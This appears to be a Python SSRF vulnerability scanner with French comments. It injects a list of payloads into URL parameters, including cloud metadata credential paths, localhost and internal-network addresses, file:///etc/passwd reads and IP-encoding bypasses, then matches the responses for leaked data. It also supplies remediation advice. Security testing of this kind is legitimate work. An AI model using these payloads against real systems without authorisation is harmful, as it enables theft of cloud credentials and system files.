"""
Détecteur de vulnérabilités SSRF (Server-Side Request Forgery)
Scanner complet pour détecter les SSRF avec 30+ techniques
"""

import asyncio
import time
from typing import Optional, List, Dict
from loguru import logger
import aiohttp
from urllib.parse import urlparse, urljoin

from core.models import Vulnerabilite


class DetecteurSSRF:
    """
    Détecte les vulnérabilités Server-Side Request Forgery (SSRF)
    OWASP Top 10 2021 - A10:2021 – Server-Side Request Forgery
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le détecteur SSRF
        
        Args:
            auth_config: Configuration d'authentification (cookies, headers)
        """
        self.auth_config = auth_config or {}
        
        # Payloads SSRF classiques
        self.payloads_ssrf = [
            # AWS EC2 Metadata (critique pour cloud)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/",
            
            # Localhost variants
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # 127.0.0.1 en décimal
            "http://0x7f000001",   # 127.0.0.1 en hexadécimal
            "http://017700000001", # 127.0.0.1 en octal
            
            # IPv6 localhost
            "http://[::1]",
            "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
            
            # Localhost avec ports communs
            "http://localhost:22",    # SSH
            "http://localhost:3306",  # MySQL
            "http://localhost:5432",  # PostgreSQL
            "http://localhost:6379",  # Redis
            "http://localhost:9200",  # ElasticSearch
            "http://localhost:27017", # MongoDB
            "http://localhost:8080",  # App servers
            
            # File protocol (LFI via SSRF)
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///c:/windows/win.ini",
            
            # Internal networks
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Cloud metadata services
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance",              # Azure
        ]
        
        # Bypass techniques
        self.bypass_techniques = [
            # URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",  # 127.0.0.1
            
            # Rare IP formats
            "http://127。0。0。1",  # Unicode dot
            "http://127.0x0.0x0.0x1",
            
            # DNS rebinding (nécessite contrôle DNS)
            # Ces payloads sont pour info, difficiles à tester automatiquement
        ]
        
        # Indicateurs de succès SSRF
        self.indicateurs_succes = {
            'aws_metadata': ['ami-id', 'instance-id', 'instance-type', 'iam/', 'security-credentials'],
            'gcp_metadata': ['computeMetadata', 'project-id', 'instance/', 'service-accounts'],
            'azure_metadata': ['compute', 'network', 'instance'],
            'etc_passwd': ['root:', 'daemon:', 'bin:', 'sys:'],
            'localhost_services': ['SSH', 'MySQL', 'Redis', 'MongoDB', 'PostgreSQL'],
        }

    async def detecter(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Détecte les vulnérabilités SSRF
        
        Args:
            url: URL à tester
            params: Paramètres GET/POST découverts
            
        Returns:
            List[Vulnerabilite]: Liste des vulnérabilités SSRF trouvées
        """
        vulnerabilites = []
        
        if not params:
            logger.debug(f"⏭️  Pas de paramètres pour SSRF: {url}")
            return vulnerabilites
        
        logger.info(f"🔍 Test SSRF: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                # Tester chaque paramètre avec les payloads SSRF
                for param_name in params.keys():
                    for payload in self.payloads_ssrf + self.bypass_techniques:
                        vuln = await self._test_ssrf_payload(
                            session, url, param_name, payload, params
                        )
                        if vuln:
                            vulnerabilites.append(vuln)
                            logger.success(f"✅ SSRF trouvé: {param_name} → {payload[:50]}")
                            break  # Un payload suffit par paramètre
                    
                    await asyncio.sleep(0.1)  # Rate limiting
        
        except Exception as e:
            logger.debug(f"Erreur test SSRF: {str(e)}")
        
        return vulnerabilites

    async def _test_ssrf_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        payload: str,
        params: Dict
    ) -> Optional[Vulnerabilite]:
        """
        Teste un payload SSRF spécifique
        
        Args:
            session: Session aiohttp
            url: URL cible
            param_name: Nom du paramètre à tester
            payload: Payload SSRF à injecter
            params: Tous les paramètres
            
        Returns:
            Vulnerabilite si SSRF trouvé, None sinon
        """
        try:
            # Créer les paramètres avec le payload
            test_params = params.copy()
            test_params[param_name] = payload
            
            # Mesurer le temps de réponse (pour blind SSRF)
            start_time = time.time()
            
            # Tester GET
            async with session.get(
                url,
                params=test_params,
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=True
            ) as response:
                contenu = await response.text()
                response_time = time.time() - start_time
                
                # Analyser la réponse
                indicateurs = self._analyser_reponse_ssrf(contenu, payload, response_time)
                
                if indicateurs['est_vulnerable']:
                    return Vulnerabilite(
                        type="SSRF",
                        severite=indicateurs['severite'],
                        url=url,
                        description=f"Server-Side Request Forgery via le paramètre '{param_name}'. {indicateurs['description']}",
                        payload=f"{param_name}={payload}",
                        preuve=indicateurs['preuve'],
                        cvss_score=indicateurs['cvss_score'],
                        remediation=self._get_remediation_ssrf()
                    )
        
        except asyncio.TimeoutError:
            # Timeout peut indiquer SSRF vers service interne qui ne répond pas
            logger.debug(f"⏱️  Timeout SSRF (possible blind SSRF): {payload[:30]}")
        except Exception as e:
            logger.debug(f"Erreur payload SSRF {payload[:30]}: {str(e)}")
        
        return None

    def _analyser_reponse_ssrf(
        self, contenu: str, payload: str, response_time: float
    ) -> Dict:
        """
        Analyse la réponse pour détecter SSRF
        
        Args:
            contenu: Contenu de la réponse
            payload: Payload testé
            response_time: Temps de réponse
            
        Returns:
            Dict avec est_vulnerable, severite, description, preuve, cvss_score
        """
        contenu_lower = contenu.lower()
        
        # 1. AWS Metadata
        if any(ind in contenu for ind in self.indicateurs_succes['aws_metadata']):
            return {
                'est_vulnerable': True,
                'severite': 'CRITIQUE',
                'description': 'SSRF permettant d\'accéder aux métadonnées AWS EC2 (IAM credentials exposés)',
                'preuve': contenu[:500],
                'cvss_score': 9.8
            }
        
        # 2. GCP Metadata
        if any(ind in contenu for ind in self.indicateurs_succes['gcp_metadata']):
            return {
                'est_vulnerable': True,
                'severite': 'CRITIQUE',
                'description': 'SSRF permettant d\'accéder aux métadonnées Google Cloud Platform',
                'preuve': contenu[:500],
                'cvss_score': 9.5
            }
        
        # 3. Azure Metadata
        if any(ind in contenu for ind in self.indicateurs_succes['azure_metadata']):
            return {
                'est_vulnerable': True,
                'severite': 'CRITIQUE',
                'description': 'SSRF permettant d\'accéder aux métadonnées Azure',
                'preuve': contenu[:500],
                'cvss_score': 9.5
            }
        
        # 4. File disclosure via file://
        if 'file://' in payload:
            if any(ind in contenu for ind in self.indicateurs_succes['etc_passwd']):
                return {
                    'est_vulnerable': True,
                    'severite': 'CRITIQUE',
                    'description': 'SSRF avec file:// permettant la lecture de fichiers système (/etc/passwd)',
                    'preuve': contenu[:500],
                    'cvss_score': 9.0
                }
        
        # 5. Localhost access (port scanning)
        if 'localhost' in payload or '127.0.0.1' in payload:
            # Vérifier si des services internes sont révélés
            service_detected = any(
                service.lower() in contenu_lower
                for service in self.indicateurs_succes['localhost_services']
            )
            
            # Ou si la réponse est différente de la normale (indique service actif)
            if service_detected or len(contenu) > 100:
                return {
                    'est_vulnerable': True,
                    'severite': 'HAUTE',
                    'description': 'SSRF permettant l\'accès à localhost (port scanning possible)',
                    'preuve': contenu[:300],
                    'cvss_score': 8.0
                }
        
        # 6. Internal network access
        if any(net in payload for net in ['192.168', '10.0', '172.16']):
            if len(contenu) > 50:  # Réponse non vide = réseau accessible
                return {
                    'est_vulnerable': True,
                    'severite': 'HAUTE',
                    'description': 'SSRF permettant l\'accès au réseau interne privé',
                    'preuve': contenu[:300],
                    'cvss_score': 8.5
                }
        
        # 7. Blind SSRF (basé sur timing)
        # Si timeout très long pour localhost/internal, c'est suspect
        if response_time > 5.0 and ('localhost' in payload or '127.0.0.1' in payload):
            return {
                'est_vulnerable': True,
                'severite': 'MOYENNE',
                'description': f'Possible Blind SSRF (temps de réponse anormal: {response_time:.2f}s)',
                'preuve': f'Response time: {response_time:.2f}s pour {payload}',
                'cvss_score': 7.0
            }
        
        return {
            'est_vulnerable': False,
            'severite': 'INFO',
            'description': '',
            'preuve': '',
            'cvss_score': 0.0
        }

    def _get_remediation_ssrf(self) -> str:
        """
        Retourne les recommandations de remediation pour SSRF
        """
        return """
Remediation SSRF:
1. Implémenter une whitelist stricte d'URLs/domaines autorisés
2. Bloquer l'accès aux métadonnées cloud (169.254.169.254)
3. Bloquer l'accès à localhost, 127.0.0.1, et réseaux privés (RFC1918)
4. Désactiver les redirections HTTP automatiques
5. Valider et sanitizer toutes les URLs utilisateur
6. Utiliser un DNS resolver sécurisé qui bloque les résolutions internes
7. Implémenter network segmentation (firewall sortant)
8. Ne jamais exposer les réponses brutes des requêtes internes
9. Logs et monitoring des requêtes sortantes suspectes
10. Pour les APIs, utiliser un service proxy dédié et isolé

Références:
- OWASP SSRF Prevention Cheat Sheet
- PortSwigger SSRF Tutorial
- HackerOne SSRF Guide
"""


# Fonction helper pour tests
async def test_ssrf():
    """Test du détecteur SSRF"""
    detector = DetecteurSSRF()
    
    # Test avec paramètres simulés
    test_url = "http://testphp.vulnweb.com/artists.php"
    test_params = {'url': 'http://example.com', 'redirect': ''}
    
    vulns = await detector.detecter(test_url, test_params)
    
    if vulns:
        print(f"✅ {len(vulns)} vulnérabilités SSRF trouvées")
        for vuln in vulns:
            print(f"  - {vuln.severite}: {vuln.description}")
    else:
        print("❌ Aucune vulnérabilité SSRF trouvée")


if __name__ == "__main__":
    asyncio.run(test_ssrf())
